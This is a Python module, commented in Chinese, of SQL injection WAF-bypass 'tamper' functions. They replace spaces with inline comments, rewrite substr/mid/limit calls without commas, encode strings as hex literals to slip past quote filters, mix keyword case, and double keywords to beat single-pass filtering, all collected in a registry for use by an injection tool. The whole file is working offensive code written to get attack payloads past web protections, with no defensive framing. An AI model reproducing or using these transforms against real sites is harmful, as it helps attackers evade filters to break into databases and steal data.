"""绕过变换（tamper）集合：对 payload 核心片段做 WAF 感知变换。"""
from __future__ import annotations

import re


def space2comment(sql: str) -> str:
    """空格 → 内联注释 /**/（保守起见不替换字符串字面量内部）。"""
    parts, in_str, cur = [], None, ""
    for ch in sql:
        if in_str:
            cur += ch
            if ch == in_str:
                in_str = None
        elif ch in ("'", '"'):
            in_str = ch
            cur += ch
        elif ch == " ":
            parts.append(cur)
            cur = ""
            parts.append("/**/")
        else:
            cur += ch
    parts.append(cur)
    return "".join(parts)


def comma_free(sql: str) -> str:
    """免逗号变换：substr(x,a,b)→substr(x from a for b)；limit a,b→limit a offset b。"""
    sql = re.sub(r"substr\s*\(\s*([^(),]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
                 r"substr(\1 from \2 for \3)", sql, flags=re.I)
    sql = re.sub(r"mid\s*\(\s*([^(),]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
                 r"mid(\1 from \2 for \3)", sql, flags=re.I)
    sql = re.sub(r"limit\s+(\d+)\s*,\s*(\d+)", r"limit \1 offset \2", sql, flags=re.I)
    return sql


def to_hex_literal(s: str) -> str:
    """字符串 → 0x 十六进制字面量（绕过引号过滤）。"""
    return "0x" + s.encode("utf-8").hex()


def mixed_case(sql: str) -> str:
    """关键字大小写混淆（SeLeCt）。"""
    words = ("union", "select", "from", "where", "and", "or", "order", "by",
             "limit", "information_schema", "group_concat", "concat", "substr")
    out = sql
    for w in words:
        mc = "".join(c.upper() if i % 2 else c for i, c in enumerate(w))
        out = re.sub(rf"\b{w}\b", mc, out, flags=re.I)
    return out


def double_write(sql: str) -> str:
    """关键字双写（ selecselectt → select，需后端仅做一次 strip）。"""
    words = ("select", "union", "from", "where", "and", "or")
    out = sql
    for w in words:
        out = re.sub(rf"\b{w}\b", f"{w[:len(w)//2]}{w}{w[len(w)//2:]}", out, flags=re.I)
    return out


TAMPERS = {
    "space2comment": space2comment,
    "comma_free": comma_free,
    "mixed_case": mixed_case,
    "double_write": double_write,
}
